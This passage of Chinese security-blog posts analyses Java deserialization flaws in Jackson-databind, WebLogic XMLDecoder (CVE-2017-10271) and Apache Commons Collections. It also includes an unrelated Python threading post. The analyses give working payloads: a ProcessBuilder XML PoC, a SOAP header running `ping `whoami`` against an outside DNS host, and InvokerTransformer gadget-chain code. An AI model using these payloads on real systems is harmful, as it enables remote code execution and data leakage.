xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot; http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;constructor-arg value=&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot; /&gt; &lt;property name=&quot;whatever&quot; value=&quot;#&#123; pb.start() &#125;&quot;/&gt; &lt;/bean&gt;&lt;/beans&gt; 造成代码执行： 官方已经更新黑名单列表，并计划在Jackson的大版本3.X通过api层实现基于白名单的序列化方式来应对多态类： 12345678910111213141516org.apache.commons.collections.functors.InvokerTransformerorg.apache.commons.collections.functors.InstantiateTransformerorg.apache.commons.collections4.functors.InvokerTransformerorg.apache.commons.collections4.functors.InstantiateTransformerorg.codehaus.groovy.runtime.ConvertedClosureorg.codehaus.groovy.runtime.MethodClosureorg.springframework.beans.factory.ObjectFactorycom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImplorg.apache.xalan.xsltc.trax.TemplatesImplcom.sun.rowset.JdbcRowSetImpljava.util.logging.FileHandlerjava.rmi.server.UnicastRemoteObjectorg.springframework.aop.support.AbstractBeanFactoryPointcutAdvisororg.springframework.beans.factory.config.PropertyPathFactoryBeancom.mchange.v2.c3p0.JndiRefForwardingDataSourcecom.mchange.v2.c3p0.WrapperConnectionPoolDataSource 修复建议 升级到最新版本jackson-databind 2.7.9.2，2.8.11，2.9.3.1（2018-01-13 00:04:20该版本还未发布） 禁用enableDefaultTyping()方法； 对客户端传入的JSON数据，进行过滤或者类型检查。 参考链接http://blog.nsfocus.net/jackson-framework-java-vulnerability-analysis/https://github.com/shengqi158/Jackson-databind-RCE-PoChttps://mp.weixin.qq.com/s/FOOC9EmNqGE9YB5OAu4mEAhttps://github.com/FasterXML/jackson-databind/releaseshttps://www.securityfocus.com/archive/1/archive/1/541652/100/0/threadedhttps://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/https://www.secfree.com/article-676.html","tags":[{"name":"CVE-2017-7525","slug":"CVE-2017-7525","permalink":"http://pirogue.org/tags/CVE-2017-7525/"},{"name":"CVE-2017-17485","slug":"CVE-2017-17485","permalink":"http://pirogue.org/tags/CVE-2017-17485/"},{"name":"Jackson-databind反序列化漏洞","slug":"Jackson-databind反序列化漏洞","permalink":"http://pirogue.org/tags/Jackson-databind反序列化漏洞/"},{"name":"安全分析","slug":"安全分析","permalink":"http://pirogue.org/tags/安全分析/"}]},{"title":"weblogic XMLDecoder反序列化漏洞-CVE-2017-10271","date":"2017-12-29T09:43:22.000Z","path":"2017/12/29/weblogic-XMLDecoder/","text":"XMLDecoder反序列化漏洞老外的详细利用文章：http://blog.diniscruz.com/2013/08/using-xmldecoder-to-execute-server-side.html国内的demo:http://blog.51cto.com/duallay/1961598 poc xml文件： 1234567891011&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;java version=&quot;1.8.0_131&quot; class=&quot;java.beans.XMLDecoder&quot;&gt; &lt;object class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;array class=&quot;java.lang.String&quot; length=&quot;1&quot;&gt; &lt;void index=&quot;0&quot;&gt; &lt;string&gt;/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method=&quot;start&quot; /&gt; &lt;/object&gt;&lt;/java&gt; 读取xml文件，进行反序列化执行命令代码： 1234567891011121314151617181920212223import java.io.BufferedInputStream;import java.io.FileInputStream;import java.io.FileNotFoundException;public class xmlrce &#123; public static void main(String[] args) &#123; // TODO Auto-generated method stub java.io.File file = new java.io.File(\"/Users/pirogue/IdeaProjects/weblogic/src/poc.xml\"); java.beans.XMLDecoder xd = null; try &#123; xd = new java.beans.XMLDecoder(new BufferedInputStream(new FileInputStream(file))); &#125; catch (FileNotFoundException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; Object s2 = xd.readObject(); xd.close(); &#125;&#125; CVE-2017-10271 weblogic反序列化漏洞WLSServletAdapter.class123456789101112131415public void handle(ServletContext var1, HttpServletRequest var2, HttpServletResponse var3) throws IOException &#123; if (var2.getMethod().equals(\"GET\") || var2.getMethod().equals(\"HEAD\")) &#123; HttpMetadataPublisher var4 = (HttpMetadataPublisher)this.endpoint.getSPI(HttpMetadataPublisher.class); if (var4 != null &amp;&amp; var4.handleMetadataRequest(this, this.createConnection(var1, var2, var3))) &#123; return; &#125; if (this.isOraWsdlMetadataQuery(var2.getQueryString())) &#123; this.publishWSDL(this.createConnection(var1, var2, var3)); return; &#125; &#125; super.handle(var1, var2, var3);&#125; 当开启调试模式，时，WLSServletAdapter对请求进行接收处理，执行到super.handle(var1, var2, var3);后，跟进关键代码如下： WorkContentServerTube.class 123456789101112131415161718public NextAction processRequest(Packet var1) &#123; this.isUseOldFormat = false; if (var1.getMessage() != null) &#123; HeaderList var2 = var1.getMessage().getHeaders(); Header var3 = var2.get(WorkAreaConstants.WORK_AREA_HEADER, true); if (var3 != null) &#123; this.readHeaderOld(var3); this.isUseOldFormat = true; &#125; Header var4 = var2.get(this.JAX_WS_WORK_AREA_HEADER, true); if (var4 != null) &#123; this.readHeader(var4); &#125; &#125; return super.processRequest(var1);&#125; 将var3传递给readHeaderOld(var3)，继续跟进readHeaderOld。var1的值:1234567891011121314151617com.sun.xml.ws.api.message.Packet@4419bacb Content: &lt;?xml version='1.0' encoding='UTF-8'?&gt;&lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"&gt;&lt;soapenv:Header&gt;&lt;work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"&gt; &lt;java version=\"1.8.0_131\" class=\"java.beans.XMLDecoder\"&gt; &lt;void class=\"java.lang.ProcessBuilder\"&gt; &lt;array class=\"java.lang.String\" length=\"3\"&gt; &lt;void index=\"0\"&gt; &lt;string&gt;/bin/bash&lt;/string&gt; &lt;/void&gt; &lt;void index=\"1\"&gt; &lt;string&gt;-c&lt;/string&gt; &lt;/void&gt; &lt;void index=\"2\"&gt; &lt;string&gt;ping `whoami`.7153b738c41fxxxxxxaadf9dbd46.tu4.org&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method=\"start\"/&gt;&lt;/void&gt; &lt;/java&gt; &lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt; WorkContextTube.class123456789101112131415161718protected void readHeaderOld(Header var1) &#123; try &#123; XMLStreamReader var2 = var1.readHeader(); var2.nextTag(); var2.nextTag(); XMLStreamReaderToXMLStreamWriter var3 = new XMLStreamReaderToXMLStreamWriter(); ByteArrayOutputStream var4 = new ByteArrayOutputStream(); XMLStreamWriter var5 = XMLStreamWriterFactory.create(var4); var3.bridge(var2, var5); var5.close(); WorkContextXmlInputAdapter var6 = new WorkContextXmlInputAdapter(new ByteArrayInputStream(var4.toByteArray())); this.receive(var6); &#125; catch (XMLStreamException var7) &#123; throw new WebServiceException(var7); &#125; catch (IOException var8) &#123; throw new WebServiceException(var8); &#125;&#125; 基础知识拓展：ByteArrayInputStream的用法：12345InputStream|__ ByteArrayInputStreamOutputStream|__ ByteArrayOutputStream ByteArrayInputStream可以将字节数组转化为输入流。ByteArrayOutputStream可以捕获内存缓冲区的数据，转化成字节数组。 构造函数：123public ByteArrayInputStream(byte buf[])public ByteArrayInputStream(byte buf[], int offset, int length) 注意它需要提供一个byte数组作为缓冲区。 我们通过idea代码窗口内可以看到各个变量在调试运行后的值，var4的值就是接收poc的xml，在WorkContextXmlInputAdapter var6 = new WorkContextXmlInputAdapter(new ByteArrayInputStream(var4.toByteArray()));中，要创建WorkContextXmlInputAdapter的实例var6, 则var4.toByteArray()先转换成字节数组，传入ByteArrayInputStream转换成输入流，跟进WorkContextXmlInputAdapter，在WorkContextXmlInputAdapter.class内，WorkContextXmlInputAdapter接收输入流，并将输入流转换成XMLDecoder对象，这时如果再调用XMLDecoder的readObject()方法对其进行反序列化即可造成命令执行。其实在this.receive(var6);中，进行了多层调用最终到达readObject，下面会省略过多无关调试，记录xml反序列化相关： 下面是对WorkContextXmlInputAdapter和创建xml反序列化对象后如何执行的readObject方法造成rce的代码跟踪 WorkContextXmlInputAdapter.class123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127//// Source code recreated from a .class file by IntelliJ IDEA// (powered by Fernflower decompiler)//package weblogic.wsee.workarea;import java.beans.XMLDecoder;import java.io.FileInputStream;import java.io.IOException;import java.io.InputStream;import java.io.NotSerializableException;import weblogic.workarea.WorkContext;import weblogic.workarea.WorkContextInput;public final class WorkContextXmlInputAdapter implements WorkContextInput &#123; private final XMLDecoder xmlDecoder; public WorkContextXmlInputAdapter(InputStream var1) &#123; this.xmlDecoder = new XMLDecoder(var1); // WorkContextXmlInputAdapter构造函数，将输入流转换成XMLDecoder反序列化对象 &#125; public WorkContextXmlInputAdapter(XMLDecoder var1) &#123; this.xmlDecoder = var1; &#125; public String readASCII() throws IOException &#123; return (String)this.xmlDecoder.readObject(); &#125; public WorkContext readContext() throws IOException, ClassNotFoundException &#123; Class var1 = Class.forName(this.readASCII()); try &#123; WorkContext var2 = (WorkContext)var1.newInstance(); var2.readContext(this); return var2; &#125; catch (InstantiationException var3) &#123; throw (IOException)(new NotSerializableException(\"WorkContext must have a public no-arg constructor\")).initCause(var3); &#125; catch (IllegalAccessException var4) &#123; throw (IOException)(new NotSerializableException(\"WorkContext must have a public no-arg constructor\")).initCause(var4); &#125; &#125; public void readFully(byte[] var1) throws IOException &#123; byte[] var2 = (byte[])((byte[])this.xmlDecoder.readObject()); System.arraycopy(var2, 0, var1, 0, var2.length); &#125; public void readFully(byte[] var1, int var2, int var3) throws IOException &#123; byte[] var4 = (byte[])((byte[])this.xmlDecoder.readObject()); System.arraycopy(var4, 0, var1, var2, var3); &#125; public int skipBytes(int var1) throws IOException &#123; throw new UnsupportedOperationException(); &#125; public boolean readBoolean() throws IOException &#123; return (Boolean)this.xmlDecoder.readObject(); &#125; public byte readByte() throws IOException &#123; return (Byte)this.xmlDecoder.readObject(); &#125; public int readUnsignedByte() throws IOException &#123; return (Integer)this.xmlDecoder.readObject(); &#125; public short readShort() throws IOException &#123; return (Short)this.xmlDecoder.readObject(); &#125; public int readUnsignedShort() throws IOException &#123; return (Integer)this.xmlDecoder.readObject(); &#125; public char readChar() throws IOException &#123; return (Character)this.xmlDecoder.readObject(); &#125; public int readInt() throws IOException &#123; return (Integer)this.xmlDecoder.readObject(); &#125; public long readLong() throws IOException &#123; return (Long)this.xmlDecoder.readObject(); &#125; public float readFloat() throws IOException &#123; return (Float)this.xmlDecoder.readObject(); &#125; public double readDouble() throws IOException &#123; return (Double)this.xmlDecoder.readObject(); &#125; public String readLine() throws IOException &#123; return (String)this.xmlDecoder.readObject(); &#125; public String readUTF() throws IOException &#123; return (String)this.xmlDecoder.readObject(); &#125; public static void main(String[] var0) throws Exception &#123; XMLDecoder var1 = new XMLDecoder(new FileInputStream(var0[0])); WorkContextXmlInputAdapter var2 = new WorkContextXmlInputAdapter(var1); System.out.println(var2.readASCII()); System.out.println(var2.readInt()); byte[] var3 = new byte[20]; var2.readFully(var3); System.out.println(var3); System.out.println(var2.readBoolean()); System.out.println(var2.readByte()); System.out.println(var2.readShort()); System.out.println(var2.readChar()); System.out.println(var2.readInt()); System.out.println(var2.readLong()); System.out.println(var2.readFloat()); System.out.println(var2.readDouble()); System.out.println(var2.readUTF()); System.out.println(var2.readUTF()); System.out.println(var2.readUTF()); &#125;&#125; WorkContextXmlInputAdapter-&gt;new XMLDecoder(var1) WorkContextEntrylmpl.class1234public static WorkContextEntry readEntry(WorkContextInput var0) throws IOException, ClassNotFoundException &#123; String var1 = var0.readUTF(); return (WorkContextEntry)(var1.length() == 0 ? NULL_CONTEXT : new WorkContextEntryImpl(var1, var0));&#125; 第72行，readUTF() WorkContextXmlInputAdapter.class第103行 123public String readUTF() throws IOException &#123; return (String)this.xmlDecoder.readObject();&#125; 当WorkContextEntrylmpl.class中的readUTF执行完成之后，返回反序列化的字符串，rce也执行完成！ weglogic log:1/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs 参考链接&nbsp;&nbsp;xxlegend: Weblogic XMLDecoder RCE分析&nbsp;&nbsp;Tomato: WebLogic WLS-WebServices组件反序列化漏洞分析&nbsp;&nbsp;童话：CVE-2017-3506 &amp; 10271：Weblogic 远程代码执行漏洞分析及复现笔记&nbsp;&nbsp;漏洞环境：Vulhub 写在最后由于业务发展需要对java知识栈进行学习，而本人对java的熟悉程度，仅限于大学课堂java逃课的水平，非常感谢廖新喜和Tomato的指点，包括idea远程调试docker内的weblogic、weblogic的关键目录结构和jar包、jd-gui。","tags":[{"name":"安全分析","slug":"安全分析","permalink":"http://pirogue.org/tags/安全分析/"},{"name":"CVE-2017-10271","slug":"CVE-2017-10271","permalink":"http://pirogue.org/tags/CVE-2017-10271/"},{"name":"java反序列化","slug":"java反序列化","permalink":"http://pirogue.org/tags/java反序列化/"},{"name":"weblogic反序列化漏洞","slug":"weblogic反序列化漏洞","permalink":"http://pirogue.org/tags/weblogic反序列化漏洞/"},{"name":"XMLDecoder反序列化漏洞","slug":"XMLDecoder反序列化漏洞","permalink":"http://pirogue.org/tags/XMLDecoder反序列化漏洞/"}]},{"title":"python回调函数中使用多线程","date":"2017-12-23T06:53:52.000Z","path":"2017/12/23/call_back_func/","text":"python回调函数demo 下面的demo是根据需求写的简单测试脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#!/usr/bin/env python# coding: utf-8# 第一个列表为依赖组件和版本号，后面紧跟负责人名称# 接着出现第二个依赖组件列表，负责人为空了# 所以根据需求需要对组件、版本号、负责人进行不同处理# 这时在for循环中根据if判断，写回调函数处理# 格式不一致数据的测试数据a = [[u'tool-1', u'1.9.13'], u'xiaowang', u'xiaoqu', [u'tool-2', u'1.9.23'], [u'tool-3', u'1.9.33'], [u'tool-4', u'1.9.43'], u'pi',[u'tool-5', u'1.9.53']]# a = [[u'tool-1', u'1.9.13'],u'xiaowang',[u'tool-2', u'1.9.23'],u'xiaowang', [u'tool-3', u'1.9.33'],u'xiaowang']# a = [[u'tool-1', u'1.9.13']]# [u'tool-1', u'1.9.13']your_pro = a[0]# print your_pro# [u'xiaowang', u'xiaoqu', [u'tool-2', u'1.9.23']]tmp = a[1:]# print tmpdef git_callback(whole_v, proj_value, name_value): # 如果存在负责人存在 try: if type(name_value[0]) is unicode: # 对除去列表0个索引的数据（依赖名和版本号）后面的数据进行遍历 for i in name_value: # 碰到后面的数据是列表的进行回调 if type(i) is list: tmp_index = whole_v.index(i)+1 return git_callback(whole_v, whole_v[whole_v.index(i)], whole_v[tmp_index:]) else: # 打印依赖、版本号 负责人 开始 print proj_value+i.split()+['start'] else: # 如果负责人后跟的组件这种格式的列表数据为空 # 也就是只有依赖和版本号列表数据，负责人为空，就打印依赖版本号 ver = proj_value owner = name_value if type(owner[0]) is unicode: return git_callback(whole_v, ver, owner) else: print ver # 这里是为了判断是不是到列表的最后一位 # 如果是最后一个值，且不是字符串的Unicode，而是列表 # 就直接打印出项目 if whole_v.index(owner[0]) == len(whole_v)-1: # 打印最后一个值 print whole_v[-1:] else: # 这里比较绕，打印调试吧... new_ver = whole_v[whole_v.index(ver)+1] owner = whole_v[whole_v.index(ver)+2:] return git_callback(whole_v, new_ver, owner) except IndexError as e: print proj_value print e git_callback(a, your_pro, tmp) demo的output: 12345678Boom:git_response pirogue$ python test.py[u'tool-1', u'1.9.13', u'xiaowang', 'start'][u'tool-1', u'1.9.13', u'xiaoqu', 'start'][u'tool-2', u'1.9.23'][u'tool-3', u'1.9.33'][u'tool-4', u'1.9.43', u'pi', 'start'][u'tool-5', u'1.9.53']list index out of range python的多线程 下面的代码是从主程序中，摘取出来的代码片段 1234567891011121314151617181920212223242526from multiprocessing.dummy import Pool as ThreadPool# 判断git查询返回的依赖数据格式不唯一的回调def git_callback(whole_v, proj_value, name_value, git_cookie): # whole_v = whole_v list_git = [] if name_value: # print name_value for i in name_value: # print i if i: if type(i) is list: tmp_index = whole_v.index(i)+1 return git_callback(whole_v, whole_v[whole_v.index(i)], whole_v[tmp_index:], git_cookie) else: git_cookie = str(git_cookie.split()[0])+' '+str(git_cookie.split()[1]) list_git.append(tuple(git_cookie.split(\"?\")+i.split())) print list_git pool = ThreadPool(100) result = pool.map(pool_git, list_git) print result pool.close() pool.join() else: print proj_value 上面的多线程代码片段是一个回调函数，没有完全根据demo进行改装，有了demo根据需求改起来也不难，多调试就可以了。 python多线程接收多个参数1234567from multiprocessing.dummy import Pool as ThreadPoolpool = ThreadPool(100)result = pool.map(pool_git, list_git)print resultpool.close()pool.join() pool_git是你需要多线程调用的功能函数，list_git是pool_git函数需要接收的参数，默认情况下pool_git是一个接收一个参数的函数。但是我们的功能常常设计的逻辑比较复杂，需要在pool_git中传入多个参数，这时list_git就应该给一个多个元组组成的列表。 stackoverflow上老外给的代码示例： 123456789def multi_run_wrapper(args): return add(*args)def add(x,y): return x+yif __name__ == \"__main__\": from multiprocessing import Pool pool = Pool(4) results = pool.map(multi_run_wrapper,[(1,2),(2,3),(3,4)]) print results output 1[3, 5, 7] Stack Overflow上更多的答疑方便你更好的理解：https://stackoverflow.com/questions/5442910/python-multiprocessing-pool-map-for-multiple-arguments 相信聪明的你一定能看得懂~ 多线程与多进程1from multiprocessing.dummy import Pool as ThreadPool 多线程进程池，绑定一个CPU核心 1from multiprocessing import Pool 多进程，运行于多个cpu核心 如果你搞不懂是CPU密集型的任务，还是IO密集型的任务，那就用这个库两条import都写上，然后分别实例化跑一下就知道耗时长短，用法上只是在创建对象上改几个字母就行Pool和ThreadPool的互换。 老外实例妙趣横生的讲解:《一行代码搞并行》http://chriskiehl.com/article/parallelism-in-one-line/ 学习记录贴,fighting~","tags":[{"name":"Python","slug":"Python","permalink":"http://pirogue.org/tags/Python/"},{"name":"多线程","slug":"多线程","permalink":"http://pirogue.org/tags/多线程/"},{"name":"回调函数","slug":"回调函数","permalink":"http://pirogue.org/tags/回调函数/"}]},{"title":"Apache Commons Collections反序列化漏洞学习","date":"2017-12-21T16:21:14.000Z","path":"2017/12/22/javaSerialKiller/","text":"java序列化与反序列化定义序列化就是把对象的转换成字节流，便于保存在内存、文件、数据库中（即便于存储或传输）过程；反序列化即逆过程，又字节流还原成对象。 Java中api实现序列化：java.io.ObjectOutputStream类的writeObject()方法可以实现序列化；反序列化：java.io.ObjectInputStream类的readObject()方法用于实现反序列化。 将字符串对象“中国”进行序列化存储到本地“test.ser”文件，然后再通过反序列化进行恢复打印输出的样例代码： 12345678910111213141516171819202122232425262728293031323334package serialize;import java.io.*;/*import java.io.ObjectOutputStream;import java.io.ObjectInputStream;import java.io.FileOutputStream;import java.io.FileInputStream;*/public class javaApiSerialize &#123; public static void main(String args[]) throws Exception&#123; String obj = \"中国\"; // 将序列化对象写入test.ser文件中 FileOutputStream fos = new FileOutputStream(\"test.ser\"); ObjectOutputStream os = new ObjectOutputStream(fos); os.writeObject(obj); os.close(); System.out.println(\"序列化完成\"); // 从文件test.ser中读取数据 FileInputStream fis = new FileInputStream(\"test.ser\"); ObjectInputStream ois = new ObjectInputStream(fis);// System.out.println(ois.getClass().getName()); System.out.println(ois); // 通过反序列化恢复对象obj String obj2 = (String)ois.readObject(); System.out.println(obj2); ois.close(); &#125;&#125; 概念上根本原因如果Java应用对用户的输入（序列化过的恶意数据），即不可信数据（如序列化过的命令执行代码）做了反序列化处理，产生的非预期对象的过程中可能带来任意代码执行。 Collections漏洞原因序列化和反序列化函数本身不存在漏洞，而是Collections这个第三方基础库的设计功能过于丰富（设计缺陷），安全研究员在其反序列化过程中发现了可以利用Collections特殊接口通过java语言的反射机制调用任意函数，比如命令执行函数来执行命令。 漏洞形成基础知识java反射机制1234JAVA反射机制JAVA反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法；这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制。Java反射机制主要提供了以下功能： 在运行时判断任意一个对象所属的类；在运行时构造任意一个类的对象；在运行时判断任意一个类所具有的成员变量和方法；在运行时调用任意一个对象的方法；生成动态代理。java反射机制详解及Method.invoke解释：http://blog.csdn.net/mr_tim/article/details/51594717 被序列化和反序列化的类12实现Serializable和Externalizable接口的类的对象才能被序列化。Serializable接口，只是一个标记接口，不包含任何的方法。如果我们想要序列化一个对象，首先要创建某些OutputStream(如FileOutputStream、ByteArrayOutputStream等)，然后将这些OutputStream封装在一个ObjectOutputStream中。这时候，只需要调用writeObject()方法就可以将对象序列化，并将其发送给OutputStream（记住：对象的序列化是基于字节的，不能使用Reader和Writer等基于字符的层次结构）。而饭序列的过程（即将一个序列还原成为一个对象），需要将一个InputStream(如FileInputstream、ByteArrayInputStream等)封装在ObjectInputStream内，然后调用readObject()即可。 Collections漏洞分析Collections介绍由于对java序列化/反序列化的需求，开发过程中常使用一些公共库。 Apache Commons Collections 是一个扩展了Java标准库里的Collection结构的第三方基础库。它包含有很多jar工具包如下图所示，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。 漏洞触发过程既然是反序列化漏洞，而且我们已经知道反序列化漏洞形成的根本原因是构造一个恶意的序列化rce对象，让序列化rce在反序列化时进行命令执行。 宽泛解释： 漏洞发现者就在Collectios库中找到一个继承了Serializable接口的而且可以调用命令执行的类(InvokerTransformer)，这时候InvokerTransformer创建出来的对象就是可以序列化的对象了，然后通过另外一个继承了Serializable接口的类（AnnotationInvocationHandler）去接收InvokerTransformer构造好的可序列化的任意代码执行对象，通过ObjectOutputStream将对象输出到文件payload。 因为这个payload是通过AnnotationInvocationHandler序列化的，当把payload发送到使用了低版本有漏洞的Collections的应用，ObjectInputStream方法会自动识别是使用了AnnotationInvocationHandler类序列化的对象，进而自动通过AnnotationInvocationHandler的readObject()函数对其进行反对其反序列化操作。 现在我们知道了谁可以构造代码执行，谁负责序列化和反序列化，那为什么会在反序列化时不是正常把命令执行代码反序列化成代码对象，而是执行了命令呢？这里面的触发链条和细节，我们在下面解释。 简化思路：AnnotationInvocationHandler重写的readObject()在反序列化时优先于原生的readObject()被调用，而重写的readObject()内部有修改Map变量值的操作，readObject()在反序列化时同时修改了变量值时，修改变量这一动作就会触发代码执行。 为什么修改变量会触发代码执行？ 在TransformedMap是Collectios库把Map的一个封装实现，功能是通过TransformedMap.decorate()把一个Map对象转换成另外一个Map对象。 123public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123; return new TransformedMap(map, keyTransformer, valueTransformer);&#125; 可以看到decorate函数传入的一个Map对象，Transformer类型的key，Transformer类型的value值。 Transformer是一个接口，其中定义的transform()函数用来将一个对象转换成另一个对象。代码如下： 123public interface Transformer &#123; public Object transform(Object input);&#125; 当Map中的任意项的Key或者value被修改，相应的Transformer就会被调用。而这时漏洞的核心InvokerTransformer出现了，它继承了Transformer和Serializable接口，内部通过Java的反射机制可以调用任意函数，只需传入方法名、参数类型和参数。 123456789101112131415161718192021222324252627282930public class InvokerTransformer implements Transformer, Serializable &#123;... public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args; &#125; public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); &#125; catch (NoSuchMethodException ex) &#123; throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' does not exist\"); &#125; catch (IllegalAccessException ex) &#123; throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' cannot be accessed\"); &#125; catch (InvocationTargetException ex) &#123; throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' threw an exception\", ex); &#125; &#125;&#125; 若通过它调用Runtime.getRuntime().exec()便可以执行命令，且因继承了Serializable也是易序列化的。重要的是多个Transformer能串联起来，形成ChainedTransformer，而ChainedTransformer正好可以承载Runtime.getRuntime().exec()。 12345678910111213public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; \"getRuntime\", new Class[0] &#125;), new InvokerTransformer(\"invoke\", new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;), new InvokerTransformer(\"exec\", new Class[] &#123; String.class &#125;, new Object[] &#123;\"calc.exe\"&#125;)&#125;; Transformer transformedChain = new ChainedTransformer(transformers); 而上面我们讲到为什么修改Map值，触发代码执行，上面这里便是关键。因为我们构造出了ChainedTransformer承载了 1((Runtime)Runtime.class.getMethod(\"getRuntime\",null).invoke(null,null)).exec(\"calc.exe\"); 而TransformedMap.decorate()可以把一个Map对象转换成另外一个Map对象，而decorate()的第3个参数传入的就是一个Transformer，我们构造的ChainedTransformer就可以作为第三个参数传入。 我们先随意定义一个Map对象叫做innerMap，通过TransformedMap.decorate()把它转换成另外一个Map对象，叫做outerMap，而decorate()传入的第三个参数就是我们构造好的ChainedTransformer任意代码触发链。这时候如果后面的操作修改了被转换出来的Map对象outerMap的值，就会触发ChainedTransformer内的一系列InvokerTransformer，造成代码执行。 下面是我们通过人为通过Map自己内部的方法修改元素的值来达到触发的目的: 123456789101112131415161718192021222324252627282930313233343536373839package serialize;import java.*;import java.util.HashMap;import java.util.Map;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;public class Map_Entry &#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; \"getRuntime\", new Class[0] &#125;), new InvokerTransformer(\"invoke\", new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;), new InvokerTransformer(\"exec\", new Class[] &#123; String.class &#125;, new Object[] &#123;\" /Applications/Calculator.app/Contents/MacOS/Calculator\"&#125;)&#125;; Transformer transformedChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); innerMap.put(\"value\", \"value\"); Map outerMap = TransformedMap.decorate(innerMap, null, transformedChain); Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next(); onlyElement.setValue(\"foobar\"); &#125;&#125; 所以到这里,我们再回头看一下宽泛解释,我们要通过反序列化去自动触发RCE，而不是人为通过Map方法修改Map值触发，所以找到AnnotationInvocationHandler，它的readObject()函数，函数内对memberValues所有的值都有setValue操作，自动触发Transformer构造的rce链。 AnnotationInvocationHandler类继承InvocationHandler和Serializable： 123456789class AnnotationInvocationHandler implements InvocationHandler, Serializable &#123; private final Class&lt;? extends Annotation&gt; type; private final Map&lt;String, Object&gt; memberValues; AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123; this.type = type; this.memberValues = memberValues; &#125; ... AnnotationInvocationHandler的readObject()函数内对memberValues的操作： 123456789101112131415161718192021222324252627282930313233private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; s.defaultReadObject(); // Check to make sure that types have not evolved incompatibly AnnotationType annotationType = null; try &#123; annotationType = AnnotationType.getInstance(type); &#125; catch(IllegalArgumentException e) &#123; // Class is no longer an annotation type; all bets are off return; &#125; Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123; String name = memberValue.getKey(); Class&lt;?&gt; memberType = memberTypes.get(name); if (memberType != null) &#123; // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) &#123; // 此处触发一些列的Transformer memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + \"[\" + value + \"]\").setMember( annotationType.members().get(name))); &#125; &#125; &#125;&#125; AnnotationInvocationHandler序列化构造 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293package serialize;import java.io.File;import java.io.FileInputStream;import java.io.FileNotFoundException;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.annotation.Retention;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.util.HashMap;import java.util.Map;import java.util.Map.Entry;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;public class Poc&#123; public static void main(String[] args) throws Exception &#123; //transformers: 一个transformer链，包含各类transformer对象（预设转化逻辑）的转化数组 Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class), /* 由于Method类的invoke(Object obj,Object args[])方法的定义 所以在反射内写new Class[] &#123;Object.class, Object[].class &#125; 正常POC流程举例： 